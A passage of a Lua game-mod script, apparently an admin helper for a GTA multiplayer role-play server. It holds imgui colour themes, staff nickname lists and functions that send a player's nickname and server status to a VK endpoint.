	colors[clr.ResizeGripActive] = ImVec4(1.00, 1.00, 1.00, 0.90)
	colors[clr.CloseButton] = ImVec4(1.00, 0.10, 0.24, 0.00)
	colors[clr.CloseButtonHovered] = ImVec4(0.00, 0.10, 0.24, 0.00)
	colors[clr.CloseButtonActive] = ImVec4(1.00, 0.10, 0.24, 0.00)
	colors[clr.PlotLines] = ImVec4(0.00, 0.00, 0.00, 0.00)
	colors[clr.PlotLinesHovered] = ImVec4(0.00, 0.00, 0.00, 0.00)
	colors[clr.PlotHistogram] = ImVec4(0.00, 0.00, 0.00, 0.00)
	colors[clr.PlotHistogramHovered] = ImVec4(0.00, 0.00, 0.00, 0.00)
	colors[clr.TextSelectedBg] = ImVec4(0.00, 0.00, 0.00, 0.00)
	colors[clr.ModalWindowDarkening] = ImVec4(0.00, 0.00, 0.00, 0.00)
end

function theme10()
	local style = imgui.GetStyle()
  local colors = style.Colors
  local clr = imgui.Col
  local ImVec4 = imgui.ImVec4
	local ImVec2 = imgui.ImVec2
	style.WindowPadding = imgui.ImVec2(9, 5)
	style.WindowRounding = 10
	style.ChildWindowRounding = 10
	style.FramePadding = imgui.ImVec2(5, 3)
	style.FrameRounding = 6.0
	style.ItemSpacing = imgui.ImVec2(9.0, 3.0)
	style.ItemInnerSpacing = imgui.ImVec2(9.0, 3.0)
	style.IndentSpacing = 21
	style.ScrollbarSize = 6.0
	style.ScrollbarRounding = 13
	style.GrabMinSize = 17.0
	style.GrabRounding = 16.0

	style.WindowTitleAlign = imgui.ImVec2(0.5, 0.5)
	style.ButtonTextAlign = imgui.ImVec2(0.5, 0.5)
  colors[clr.Text] = ImVec4(0.95, 0.96, 0.98, 1.00)
  colors[clr.TextDisabled] = ImVec4(0.36, 0.42, 0.47, 1.00)
  colors[clr.WindowBg] = ImVec4(0.11, 0.15, 0.17, 1.00)
  colors[clr.ChildWindowBg] = ImVec4(0.15, 0.18, 0.22, 1.00)
  colors[clr.PopupBg] = ImVec4(0.08, 0.08, 0.08, 0.94)
  colors[clr.Border] = ImVec4(0.43, 0.43, 0.50, 0.50)
  colors[clr.BorderShadow] = ImVec4(0.00, 0.00, 0.00, 0.00)
  colors[clr.FrameBg] = ImVec4(0.20, 0.25, 0.29, 1.00)
  colors[clr.FrameBgHovered] = ImVec4(0.12, 0.20, 0.28, 1.00)
  colors[clr.FrameBgActive] = ImVec4(0.09, 0.12, 0.14, 1.00)
  colors[clr.TitleBg] = ImVec4(0.09, 0.12, 0.14, 0.65)
  colors[clr.TitleBgCollapsed] = ImVec4(0.00, 0.00, 0.00, 0.51)
  colors[clr.TitleBgActive] = ImVec4(0.08, 0.10, 0.12, 1.00)
  colors[clr.MenuBarBg] = ImVec4(0.15, 0.18, 0.22, 1.00)
  colors[clr.ScrollbarBg] = ImVec4(0.02, 0.02, 0.02, 0.39)
  colors[clr.ScrollbarGrab] = ImVec4(0.20, 0.25, 0.29, 1.00)
  colors[clr.ScrollbarGrabHovered] = ImVec4(0.18, 0.22, 0.25, 1.00)
  colors[clr.ScrollbarGrabActive] = ImVec4(0.09, 0.21, 0.31, 1.00)
  colors[clr.ComboBg] = ImVec4(0.20, 0.25, 0.29, 1.00)
  colors[clr.CheckMark] = ImVec4(0.28, 0.56, 1.00, 1.00)
  colors[clr.SliderGrab] = ImVec4(0.28, 0.56, 1.00, 1.00)
  colors[clr.SliderGrabActive] = ImVec4(0.37, 0.61, 1.00, 1.00)
  colors[clr.Button] = ImVec4(0.20, 0.25, 0.29, 1.00)
  colors[clr.ButtonHovered] = ImVec4(0.28, 0.56, 1.00, 1.00)
  colors[clr.ButtonActive] = ImVec4(0.06, 0.53, 0.98, 1.00)
  colors[clr.Header] = ImVec4(0.20, 0.25, 0.29, 0.55)
  colors[clr.HeaderHovered] = ImVec4(0.26, 0.59, 0.98, 0.80)
  colors[clr.HeaderActive] = ImVec4(0.26, 0.59, 0.98, 1.00)
  colors[clr.ResizeGrip] = ImVec4(0.26, 0.59, 0.98, 0.25)
  colors[clr.ResizeGripHovered] = ImVec4(0.26, 0.59, 0.98, 0.67)
  colors[clr.ResizeGripActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
  colors[clr.CloseButton] = ImVec4(0.40, 0.39, 0.38, 0.16)
  colors[clr.CloseButtonHovered] = ImVec4(0.40, 0.39, 0.38, 0.39)
  colors[clr.CloseButtonActive] = ImVec4(0.40, 0.39, 0.38, 1.00)
  colors[clr.PlotLines] = ImVec4(0.61, 0.61, 0.61, 1.00)
  colors[clr.PlotLinesHovered] = ImVec4(1.00, 0.43, 0.35, 1.00)
  colors[clr.PlotHistogram] = ImVec4(0.90, 0.70, 0.00, 1.00)
  colors[clr.PlotHistogramHovered] = ImVec4(1.00, 0.60, 0.00, 1.00)
  colors[clr.TextSelectedBg] = ImVec4(0.25, 1.00, 0.00, 0.43)
  colors[clr.ModalWindowDarkening] = ImVec4(1.00, 0.98, 0.95, 0.73)
end

function zoloto()
	local style = imgui.GetStyle()
  local colors = style.Colors
  local clr = imgui.Col
  local ImVec4 = imgui.ImVec4

  colors[clr.Text]                   = ImVec4(1.00, 1.00, 1.00, 1.00)
  colors[clr.TextDisabled]           = ImVec4(1.00, 1.00, 1.00, 1.00)
  colors[clr.WindowBg]               = ImVec4(0.00, 0.00, 0.00, 0.93)
  colors[clr.ChildWindowBg]          = ImVec4(0.00, 0.00, 0.00, 0.80)
  colors[clr.PopupBg]                = ImVec4(0.08, 0.08, 0.09, 0.94)
  colors[clr.Border]                 = ImVec4(0.97, 1.00, 0.00, 0.65)
  colors[clr.BorderShadow]           = ImVec4(0.00, 0.00, 0.00, 0.00)
  colors[clr.FrameBg]                = ImVec4(1.00, 0.96, 0.00, 0.68)
  colors[clr.FrameBgHovered]         = ImVec4(0.79, 0.93, 0.04, 0.40)
  colors[clr.FrameBgActive]          = ImVec4(0.96, 0.83, 0.04, 0.45)
  colors[clr.TitleBg]                = ImVec4(0.80, 0.80, 0.12, 0.87)
  colors[clr.TitleBgActive]          = ImVec4(0.95, 0.72, 0.00, 0.87)
  colors[clr.TitleBgCollapsed]       = ImVec4(0.88, 0.90, 0.08, 0.20)
  colors[clr.MenuBarBg]              = ImVec4(0.85, 0.97, 0.04, 0.80)
  colors[clr.ScrollbarBg]            = ImVec4(0.90, 0.67, 0.05, 0.60)
  colors[clr.ScrollbarGrab]          = ImVec4(0.82, 0.87, 0.10, 0.88)
  colors[clr.ScrollbarGrabHovered]   = ImVec4(0.86, 0.81, 0.13, 0.40)
  colors[clr.ScrollbarGrabActive]    = ImVec4(0.92, 0.86, 0.07, 0.40)
  colors[clr.ComboBg]                = ImVec4(0.76, 0.63, 0.03, 0.99)
  colors[clr.CheckMark]              = ImVec4(1.00, 1.00, 1.00, 1.00)
  colors[clr.SliderGrab]             = ImVec4(1.00, 1.00, 1.00, 1.00)
  colors[clr.SliderGrabActive]       = ImVec4(1.00, 1.00, 1.00, 1.00)
  colors[clr.Button]                 = ImVec4(0.97, 1.00, 0.00, 0.66)
  colors[clr.ButtonHovered]          = ImVec4(0.85, 0.90, 0.02, 1.00)
  colors[clr.ButtonActive]           = ImVec4(0.92, 0.74, 0.04, 1.00)
  colors[clr.Header]                 = ImVec4(0.80, 0.94, 0.04, 0.45)
  colors[clr.HeaderHovered]          = ImVec4(0.90, 0.79, 0.13, 0.80)
  colors[clr.HeaderActive]           = ImVec4(0.87, 0.86, 0.05, 0.80)
  colors[clr.Separator]              = ImVec4(0.91, 0.82, 0.06, 1.00)
  colors[clr.SeparatorHovered]       = ImVec4(0.96, 0.90, 0.08, 1.00)
  colors[clr.SeparatorActive]        = ImVec4(0.97, 0.91, 0.04, 1.00)
  colors[clr.ResizeGrip]             = ImVec4(1.00, 1.00, 1.00, 0.30)
  colors[clr.ResizeGripHovered]      = ImVec4(1.00, 1.00, 1.00, 0.60)
  colors[clr.ResizeGripActive]       = ImVec4(1.00, 1.00, 1.00, 0.90)
  colors[clr.CloseButton]            = ImVec4(0.84, 0.90, 0.50, 0.57)
  colors[clr.CloseButtonHovered]     = ImVec4(0.90, 0.89, 0.70, 0.60)
  colors[clr.CloseButtonActive]      = ImVec4(0.70, 0.70, 0.70, 1.00)
  colors[clr.PlotLines]              = ImVec4(1.00, 1.00, 1.00, 1.00)
  colors[clr.PlotLinesHovered]       = ImVec4(0.90, 0.70, 0.00, 1.00)
  colors[clr.PlotHistogram]          = ImVec4(0.90, 0.70, 0.00, 1.00)
  colors[clr.PlotHistogramHovered]   = ImVec4(1.00, 0.60, 0.00, 1.00)
  colors[clr.TextSelectedBg]         = ImVec4(0.00, 0.02, 1.00, 0.35)
  colors[clr.ModalWindowDarkening]   = ImVec4(0.20, 0.20, 0.20, 0.35)
end

function blackred()
	imgui.SwitchContext()
	local style = imgui.GetStyle()
	local colors = style.Colors
	local clr = imgui.Col
	local ImVec4 = imgui.ImVec4

	style.WindowPadding = imgui.ImVec2(9, 5)
	style.WindowRounding = 10
	style.ChildWindowRounding = 10
	style.FramePadding = imgui.ImVec2(5, 3)
	style.FrameRounding = 6.0
	style.ItemSpacing = imgui.ImVec2(9.0, 3.0)
	style.ItemInnerSpacing = imgui.ImVec2(9.0, 3.0)
	style.IndentSpacing = 21
	style.ScrollbarSize = 6.0
	style.ScrollbarRounding = 13
	style.GrabMinSize = 17.0
	style.GrabRounding = 16.0
  style.WindowTitleAlign = imgui.ImVec2(0.5, 0.5)
  style.ButtonTextAlign = imgui.ImVec2(0.5, 0.5)

  colors[clr.Text]                   = ImVec4(0.95, 0.96, 0.98, 1.00);
  colors[clr.TextDisabled]           = ImVec4(0.29, 0.29, 0.29, 1.00);
  colors[clr.WindowBg]               = ImVec4(0.14, 0.14, 0.14, 1.00);
  colors[clr.ChildWindowBg]          = ImVec4(0.12, 0.12, 0.12, 1.00);
  colors[clr.PopupBg]                = ImVec4(0.08, 0.08, 0.08, 0.94);
  colors[clr.Border]                 = ImVec4(0.14, 0.14, 0.14, 1.00);
  colors[clr.BorderShadow]           = ImVec4(1.00, 1.00, 1.00, 0.10);
  colors[clr.FrameBg]                = ImVec4(0.22, 0.22, 0.22, 1.00);
  colors[clr.FrameBgHovered]         = ImVec4(0.18, 0.18, 0.18, 1.00);
  colors[clr.FrameBgActive]          = ImVec4(0.09, 0.12, 0.14, 1.00);
  colors[clr.TitleBg]                = ImVec4(0.14, 0.14, 0.14, 1.00);
  colors[clr.TitleBgActive]          = ImVec4(0.14, 0.14, 0.14, 1.00);
  colors[clr.TitleBgCollapsed]       = ImVec4(0.14, 0.14, 0.14, 1.00);
  colors[clr.MenuBarBg]              = ImVec4(0.20, 0.20, 0.20, 1.00);
  colors[clr.ScrollbarBg]            = ImVec4(0.02, 0.02, 0.02, 0.39);
  colors[clr.ScrollbarGrab]          = ImVec4(0.36, 0.36, 0.36, 1.00);
  colors[clr.ScrollbarGrabHovered]   = ImVec4(0.18, 0.22, 0.25, 1.00);
  colors[clr.ScrollbarGrabActive]    = ImVec4(0.24, 0.24, 0.24, 1.00);
  colors[clr.ComboBg]                = ImVec4(0.24, 0.24, 0.24, 1.00);
  colors[clr.CheckMark]              = ImVec4(1.00, 0.28, 0.28, 1.00);
  colors[clr.SliderGrab]             = ImVec4(1.00, 0.28, 0.28, 1.00);
  colors[clr.SliderGrabActive]       = ImVec4(1.00, 0.28, 0.28, 1.00);
  colors[clr.Button]                 = ImVec4(1.00, 0.28, 0.28, 1.00);
  colors[clr.ButtonHovered]          = ImVec4(1.00, 0.39, 0.39, 1.00);
  colors[clr.ButtonActive]           = ImVec4(1.00, 0.21, 0.21, 1.00);
  colors[clr.Header]                 = ImVec4(1.00, 0.28, 0.28, 1.00);
  colors[clr.HeaderHovered]          = ImVec4(1.00, 0.39, 0.39, 1.00);
  colors[clr.HeaderActive]           = ImVec4(1.00, 0.21, 0.21, 1.00);
  colors[clr.ResizeGrip]             = ImVec4(1.00, 0.28, 0.28, 1.00);
  colors[clr.ResizeGripHovered]      = ImVec4(1.00, 0.39, 0.39, 1.00);
  colors[clr.ResizeGripActive]       = ImVec4(1.00, 0.19, 0.19, 1.00);
  colors[clr.CloseButton]            = ImVec4(0.40, 0.39, 0.38, 0.16);
  colors[clr.CloseButtonHovered]     = ImVec4(0.40, 0.39, 0.38, 0.39);
  colors[clr.CloseButtonActive]      = ImVec4(0.40, 0.39, 0.38, 1.00);
  colors[clr.PlotLines]              = ImVec4(0.61, 0.61, 0.61, 1.00);
  colors[clr.PlotLinesHovered]       = ImVec4(1.00, 0.43, 0.35, 1.00);
  colors[clr.PlotHistogram]          = ImVec4(1.00, 0.21, 0.21, 1.00);
  colors[clr.PlotHistogramHovered]   = ImVec4(1.00, 0.18, 0.18, 1.00);
  colors[clr.TextSelectedBg]         = ImVec4(1.00, 0.32, 0.32, 1.00);
  colors[clr.ModalWindowDarkening]   = ImVec4(0.26, 0.26, 0.26, 0.60);
end

function theme11()
	local style = imgui.GetStyle()
  local colors = style.Colors
  local clr = imgui.Col
  local ImVec4 = imgui.ImVec4
  local ImVec2 = imgui.ImVec2
	style.WindowPadding = imgui.ImVec2(9, 5)
	style.WindowRounding = 10
	style.ChildWindowRounding = 10
	style.FramePadding = imgui.ImVec2(5, 3)
	style.FrameRounding = 6.0
	style.ItemSpacing = imgui.ImVec2(9.0, 3.0)
	style.ItemInnerSpacing = imgui.ImVec2(9.0, 3.0)
	style.IndentSpacing = 21
	style.ScrollbarSize = 6.0
	style.ScrollbarRounding = 13
	style.GrabMinSize = 17.0
	style.GrabRounding = 16.0

	style.WindowTitleAlign = imgui.ImVec2(0.5, 0.5)
	style.ButtonTextAlign = imgui.ImVec2(0.5, 0.5)
  style.WindowTitleAlign = ImVec2(0.5, 0.5)
  colors[clr.Text] = ImVec4(0.860, 0.930, 0.890, 0.78)
  colors[clr.TextDisabled] = ImVec4(0.860, 0.930, 0.890, 0.28)
  colors[clr.WindowBg] = ImVec4(0.13, 0.14, 0.17, 1.00)
  colors[clr.ChildWindowBg] = ImVec4(0.200, 0.220, 0.270, 0.58)
  colors[clr.PopupBg] = ImVec4(0.200, 0.220, 0.270, 0.9)
  colors[clr.Border] = ImVec4(0.31, 0.31, 1.00, 0.00)
  colors[clr.BorderShadow] = ImVec4(0.00, 0.00, 0.00, 0.00)
  colors[clr.FrameBg] = ImVec4(0.200, 0.220, 0.270, 1.00)
  colors[clr.FrameBgHovered] = ImVec4(0.455, 0.198, 0.301, 0.78)
  colors[clr.FrameBgActive] = ImVec4(0.455, 0.198, 0.301, 1.00)
  colors[clr.TitleBg] = ImVec4(0.232, 0.201, 0.271, 1.00)
  colors[clr.TitleBgActive] = ImVec4(0.502, 0.075, 0.256, 1.00)
  colors[clr.TitleBgCollapsed] = ImVec4(0.200, 0.220, 0.270, 0.75)
  colors[clr.MenuBarBg] = ImVec4(0.200, 0.220, 0.270, 0.47)
  colors[clr.ScrollbarBg] = ImVec4(0.200, 0.220, 0.270, 1.00)
  colors[clr.ScrollbarGrab] = ImVec4(0.09, 0.15, 0.1, 1.00)
  colors[clr.ScrollbarGrabHovered] = ImVec4(0.455, 0.198, 0.301, 0.78)
  colors[clr.ScrollbarGrabActive] = ImVec4(0.455, 0.198, 0.301, 1.00)
  colors[clr.CheckMark] = ImVec4(0.71, 0.22, 0.27, 1.00)
  colors[clr.SliderGrab] = ImVec4(0.47, 0.77, 0.83, 0.14)
  colors[clr.SliderGrabActive] = ImVec4(0.71, 0.22, 0.27, 1.00)
  colors[clr.Button] = ImVec4(0.47, 0.77, 0.83, 0.14)
  colors[clr.ButtonHovered] = ImVec4(0.455, 0.198, 0.301, 0.86)
  colors[clr.ButtonActive] = ImVec4(0.455, 0.198, 0.301, 1.00)
  colors[clr.Header] = ImVec4(0.455, 0.198, 0.301, 0.76)
  colors[clr.HeaderHovered] = ImVec4(0.455, 0.198, 0.301, 0.86)
  colors[clr.HeaderActive] = ImVec4(0.502, 0.075, 0.256, 1.00)
  colors[clr.ResizeGrip] = ImVec4(0.47, 0.77, 0.83, 0.04)
  colors[clr.ResizeGripHovered] = ImVec4(0.455, 0.198, 0.301, 0.78)
  colors[clr.ResizeGripActive] = ImVec4(0.455, 0.198, 0.301, 1.00)
  colors[clr.PlotLines] = ImVec4(0.860, 0.930, 0.890, 0.63)
  colors[clr.PlotLinesHovered] = ImVec4(0.455, 0.198, 0.301, 1.00)
  colors[clr.PlotHistogram] = ImVec4(0.860, 0.930, 0.890, 0.63)
  colors[clr.PlotHistogramHovered] = ImVec4(0.455, 0.198, 0.301, 1.00)
  colors[clr.TextSelectedBg] = ImVec4(0.455, 0.198, 0.301, 0.43)
  colors[clr.ModalWindowDarkening] = ImVec4(0.200, 0.220, 0.270, 0.73)
end

function theme12()
	local style  = imgui.GetStyle()
  local colors = style.Colors
  local clr    = imgui.Col
  local ImVec4 = imgui.ImVec4
  local ImVec2 = imgui.ImVec2
  colors[clr.Text]                 = ImVec4(1.00, 1.00, 1.00, 1.00)
  colors[clr.TextDisabled]         = ImVec4(0.73, 0.75, 0.74, 1.00)
  colors[clr.WindowBg]             = ImVec4(0.14, 0.06, 0.07, 1.00)
  colors[clr.ChildWindowBg]        = ImVec4(0.00, 0.00, 0.00, 0.00)
  colors[clr.PopupBg]              = ImVec4(0.14, 0.06, 0.07, 1.00)
  colors[clr.Border]               = ImVec4(0.20, 0.20, 0.20, 0.50)
  colors[clr.BorderShadow]         = ImVec4(0.00, 0.00, 0.00, 0.00)
  colors[clr.FrameBg]              = ImVec4(0.25, 0.01, 0.04, 1.00)
  colors[clr.FrameBgHovered]       = ImVec4(1.00, 0.15, 0.29, 1.00)
  colors[clr.FrameBgActive]        = ImVec4(0.14, 0.06, 0.07, 1.00)
  colors[clr.TitleBg]              = ImVec4(0.25, 0.01, 0.04, 1.00)
  colors[clr.TitleBgActive]        = ImVec4(1.00, 0.15, 0.29, 1.00)
  colors[clr.TitleBgCollapsed]     = ImVec4(0.25, 0.01, 0.04, 1.00)
  colors[clr.MenuBarBg]            = ImVec4(0.12, 0.05, 0.06, 1.00)
  colors[clr.ScrollbarBg]          = ImVec4(0.20, 0.20, 0.20, 0.99)
  colors[clr.ScrollbarGrab]        = ImVec4(0.25, 0.01, 0.04, 1.00)
  colors[clr.ScrollbarGrabHovered] = ImVec4(1.00, 0.15, 0.29, 1.00)
  colors[clr.ScrollbarGrabActive]  = ImVec4(0.14, 0.06, 0.07, 1.00)
  colors[clr.ComboBg]              = ImVec4(0.20, 0.20, 0.20, 0.99)
  colors[clr.CheckMark]            = ImVec4(1.00, 1.00, 1.00, 1.00)
  colors[clr.SliderGrab]           = ImVec4(1.00, 0.15, 0.29, 1.00)
  colors[clr.SliderGrabActive]     = ImVec4(0.14, 0.06, 0.07, 1.00)
  colors[clr.Button]               = ImVec4(0.25, 0.01, 0.04, 1.00)
  colors[clr.ButtonHovered]        = ImVec4(1.00, 0.15, 0.29, 1.00)
  colors[clr.ButtonActive]         = ImVec4(0.20, 0.20, 0.20, 0.99)
  colors[clr.Header]               = ImVec4(1.00, 0.15, 0.29, 1.00)
  colors[clr.HeaderHovered]        = ImVec4(1.00, 0.15, 0.29, 0.75)
  colors[clr.HeaderActive]         = ImVec4(1.00, 0.15, 0.29, 1.00)
  colors[clr.Separator]            = ImVec4(0.25, 0.01, 0.04, 1.00)
  colors[clr.SeparatorHovered]     = ImVec4(1.00, 0.15, 0.29, 1.00)
  colors[clr.SeparatorActive]      = ImVec4(0.25, 0.01, 0.04, 1.00)
  colors[clr.ResizeGrip]           = ImVec4(0.25, 0.01, 0.04, 1.00)
  colors[clr.ResizeGripHovered]    = ImVec4(1.00, 0.15, 0.29, 1.00)
  colors[clr.ResizeGripActive]     = ImVec4(1.00, 0.15, 0.29, 1.00)
  colors[clr.CloseButton]          = ImVec4(0.25, 0.01, 0.04, 1.00)
  colors[clr.CloseButtonHovered]   = ImVec4(1.00, 0.15, 0.29, 1.00)
  colors[clr.CloseButtonActive]    = ImVec4(0.98, 0.39, 0.36, 1.00)
  colors[clr.PlotLines]            = ImVec4(0.61, 0.61, 0.61, 1.00)
  colors[clr.PlotLinesHovered]     = ImVec4(1.00, 0.15, 0.29, 1.00)
  colors[clr.PlotHistogram]        = ImVec4(0.90, 0.70, 0.00, 1.00)
  colors[clr.PlotHistogramHovered] = ImVec4(1.00, 0.60, 0.00, 1.00)
  colors[clr.TextSelectedBg]       = ImVec4(0.26, 0.59, 0.98, 0.35)
  colors[clr.ModalWindowDarkening] = ImVec4(0.80, 0.80, 0.80, 0.35)
end

function theme13()
local style = imgui.GetStyle()
    local colors = style.Colors
    local clr = imgui.Col
    local ImVec4 = imgui.ImVec4
    local ImVec2 = imgui.ImVec2
	
	colors[clr.Text] = ImVec4(0.95, 0.96, 0.98, 1.00)
       colors[clr.TextDisabled] = ImVec4(0.36, 0.42, 0.47, 1.00)
       colors[clr.WindowBg] = ImVec4(0.11, 0.15, 0.17, 1.00)        
       colors[clr.ChildWindowBg] = ImVec4(0.11, 0.15, 0.17, 1.00)
       colors[clr.PopupBg] = ImVec4(0.08, 0.08, 0.08, 0.94)
       colors[clr.Border] = ImVec4(0.14, 0.14, 0.14, 1.00)
       colors[clr.BorderShadow] = ImVec4(1.00, 1.00, 1.00, 0.10)
       colors[clr.FrameBg] = ImVec4(0.22, 0.22, 0.22, 1.00)
       colors[clr.FrameBgHovered] = ImVec4(0.12, 0.20, 0.28, 1.00)
       colors[clr.FrameBgActive] = ImVec4(0.09, 0.12, 0.14, 1.00)
       colors[clr.TitleBg] = ImVec4(0.51, 1.00, 0.00, 0.71)
       colors[clr.TitleBgCollapsed] = ImVec4(0.83, 0.98, 0.00, 1.00)
       colors[clr.TitleBgActive] = ImVec4(0.51, 1.00, 0.00, 0.71)
       colors[clr.MenuBarBg] = ImVec4(0.15, 0.18, 0.22, 1.00)
       colors[clr.ScrollbarBg] = ImVec4(0.02, 0.02, 0.02, 0.39)
       colors[clr.ScrollbarGrab] = ImVec4(0.20, 0.25, 0.29, 1.00)
       colors[clr.ScrollbarGrabHovered] = ImVec4(0.18, 0.22, 0.25, 1.00)
       colors[clr.ScrollbarGrabActive] = ImVec4(0.09, 0.21, 0.31, 1.00)
       colors[clr.ComboBg] = ImVec4(0.20, 0.25, 0.29, 1.00)
       colors[clr.CheckMark] = ImVec4(0.51, 1.00, 0.00, 0.71)
       colors[clr.SliderGrab] = ImVec4(0.51, 1.00, 0.00, 0.71)
       colors[clr.SliderGrabActive] = ImVec4(0.51, 1.00, 0.00, 1.00)
       colors[clr.Button]          = ImVec4(0.51, 1.00, 0.00, 0.71)
       colors[clr.ButtonHovered]    = ImVec4(0.51, 1.00, 0.00, 1.00)
       colors[clr.ButtonActive]      = ImVec4(0.83, 0.98, 0.00, 1.00)
       colors[clr.Header] = ImVec4(0.51, 1.00, 0.00, 0.71)
       colors[clr.HeaderHovered] = ImVec4(0.51, 1.00, 0.00, 1.00)
       colors[clr.HeaderActive] = ImVec4(0.83, 0.98, 0.00, 1.00)
       colors[clr.ResizeGrip] = ImVec4(0.26, 0.59, 0.98, 0.25)
       colors[clr.ResizeGripHovered] = ImVec4(0.26, 0.59, 0.98, 0.67)
       colors[clr.ResizeGripActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
       colors[clr.CloseButton]          = ImVec4(0.11, 0.15, 0.17, 1.00)
    colors[clr.CloseButtonHovered]   = ImVec4(0.95, 0.79, 0.00, 1.00)
    colors[clr.CloseButtonActive]    = ImVec4(1.00, 0.05, 0.00, 1.00)
       colors[clr.PlotLines] = ImVec4(0.61, 0.61, 0.61, 1.00)
       colors[clr.PlotLinesHovered] = ImVec4(1.00, 0.43, 0.35, 1.00)
       colors[clr.PlotHistogram] = ImVec4(0.90, 0.70, 0.00, 1.00)
       colors[clr.PlotHistogramHovered] = ImVec4(1.00, 0.60, 0.00, 1.00)
       colors[clr.TextSelectedBg] = ImVec4(0.25, 1.00, 0.00, 0.43)
       colors[clr.ModalWindowDarkening] = ImVec4(1.00, 0.98, 0.95, 0.73)
end

function theme14()
    imgui.SwitchContext()
    local style = imgui.GetStyle()
    local colors = style.Colors
    local clr = imgui.Col
    local ImVec4 = imgui.ImVec4
    colors[clr.FrameBg]                = ImVec4(0.46, 0.11, 0.29, 1.00)
    colors[clr.FrameBgHovered]         = ImVec4(0.69, 0.16, 0.43, 1.00)
    colors[clr.FrameBgActive]          = ImVec4(0.58, 0.10, 0.35, 1.00)
    colors[clr.TitleBg]                = ImVec4(0.00, 0.00, 0.00, 1.00)
    colors[clr.TitleBgActive]          = ImVec4(0.61, 0.16, 0.39, 1.00)
    colors[clr.TitleBgCollapsed]       = ImVec4(0.00, 0.00, 0.00, 0.51)
    colors[clr.CheckMark]              = ImVec4(0.94, 0.30, 0.63, 1.00)
    colors[clr.SliderGrab]             = ImVec4(0.85, 0.11, 0.49, 1.00)
    colors[clr.SliderGrabActive]       = ImVec4(0.89, 0.24, 0.58, 1.00)
    colors[clr.Button]                 = ImVec4(0.46, 0.11, 0.29, 1.00)
    colors[clr.ButtonHovered]          = ImVec4(0.69, 0.17, 0.43, 1.00)
    colors[clr.ButtonActive]           = ImVec4(0.59, 0.10, 0.35, 1.00)
    colors[clr.Header]                 = ImVec4(0.46, 0.11, 0.29, 1.00)
    colors[clr.HeaderHovered]          = ImVec4(0.69, 0.16, 0.43, 1.00)
    colors[clr.HeaderActive]           = ImVec4(0.58, 0.10, 0.35, 1.00)
    colors[clr.Separator]              = ImVec4(0.69, 0.16, 0.43, 1.00)
    colors[clr.SeparatorHovered]       = ImVec4(0.58, 0.10, 0.35, 1.00)
    colors[clr.SeparatorActive]        = ImVec4(0.58, 0.10, 0.35, 1.00)
    colors[clr.ResizeGrip]             = ImVec4(0.46, 0.11, 0.29, 0.70)
    colors[clr.ResizeGripHovered]      = ImVec4(0.69, 0.16, 0.43, 0.67)
    colors[clr.ResizeGripActive]       = ImVec4(0.70, 0.13, 0.42, 1.00)
    colors[clr.TextSelectedBg]         = ImVec4(1.00, 0.78, 0.90, 0.35)
    colors[clr.Text]                   = ImVec4(1.00, 1.00, 1.00, 1.00)
    colors[clr.TextDisabled]           = ImVec4(0.60, 0.19, 0.40, 1.00)
    colors[clr.WindowBg]               = ImVec4(0.06, 0.06, 0.06, 0.94)
    colors[clr.ChildWindowBg]          = ImVec4(1.00, 1.00, 1.00, 0.00)
    colors[clr.PopupBg]                = ImVec4(0.08, 0.08, 0.08, 0.94)
    colors[clr.ComboBg]                = ImVec4(0.08, 0.08, 0.08, 0.94)
    colors[clr.Border]                 = ImVec4(0.49, 0.14, 0.31, 1.00)
    colors[clr.BorderShadow]           = ImVec4(0.49, 0.14, 0.31, 0.00)
    colors[clr.MenuBarBg]              = ImVec4(0.15, 0.15, 0.15, 1.00)
    colors[clr.ScrollbarBg]            = ImVec4(0.02, 0.02, 0.02, 0.53)
    colors[clr.ScrollbarGrab]          = ImVec4(0.31, 0.31, 0.31, 1.00)
    colors[clr.ScrollbarGrabHovered]   = ImVec4(0.41, 0.41, 0.41, 1.00)
    colors[clr.ScrollbarGrabActive]    = ImVec4(0.51, 0.51, 0.51, 1.00)
    colors[clr.CloseButton]            = ImVec4(0.41, 0.41, 0.41, 0.50)
    colors[clr.CloseButtonHovered]     = ImVec4(0.98, 0.39, 0.36, 1.00)
    colors[clr.CloseButtonActive]      = ImVec4(0.98, 0.39, 0.36, 1.00)
    colors[clr.ModalWindowDarkening]   = ImVec4(0.80, 0.80, 0.80, 0.35)
end


function sampev.onTogglePlayerSpectating(state)
	if state then
		recon_menu = true
	else
		recon_menu = false
	end
end

accessName = {'Nik_Everyone', 'Charlie_Salieri', 'Nikita_Akkerman', 'Kraim_Ferreira', 'Nairobi_Mikaelson', 'Hope_Mikaelson'}

adelyaName = {'Adelya_Sxredfoord'} 
kraimName = {'Bonnie_Extazzue'}
akinaName = {'Akina_Alfonso'}


helperName = {'Sean_Everyone'}
mlmoderatorName = {'Charlie_Salieri'}
moderatorName = {'HUY'}
stmoderatorName = {'HUY'}
mladminName = {'Neddy_Everyone'}
adminName = {'Lucifer_Coble'}
razrabName = {'Xavier_Velasquez', 'Accord_Mikaelson'}
vladelName = {'Michael_Desquise', 'Nik_Everyone'}
function sendReload()  
reloadvk = true
local response = ''
	response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
		response = response .. '������ ������������... \n\n �� ���������� ������� �������� �� ����� ������������. \n\n'
		sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}{FF0000}��������! {FFFFFF}��������� {ffffff}�������� {32CD32}������������ {ffffff}������� .', 0xffdead)
		sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}{FFFFFF}���������: {FFA500}S U P Developer Club {ffffff}.', 0xffdead)
		lua_thread.create(function()
		wait(1000)
		sampAddChatMessage('{ffdead}[FReport Helper]: {32CD32}������������{ffffff}...', 0xffdead)
		wait(1000)
		cfg.settings.unload = true
			cfg.settings.unloadlvl = lvl
			inicfg.save(cfg, cfgConfig)
			thisScript():reload()
		end)
--sampSendChat('/a [For Developers] [FReport Helper]: � ������� ������ ���������� FReport Helper 2.3 .')
vk_request(response)

end
function sendStatus()
result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
	local response = ''
	if reloadvk == true then 
	response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
		response = response .. '�������� ������������, �������� �������������. \n\n'
		vk_request(response)
	else
	if statusNick.v then
				response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
	end
	if statusServer.v and sampGetCurrentServerName() then
	--[[if ip == '193.84.90.17:7771' then
	response = response .. '������: 01 Flin RP\n'
	else
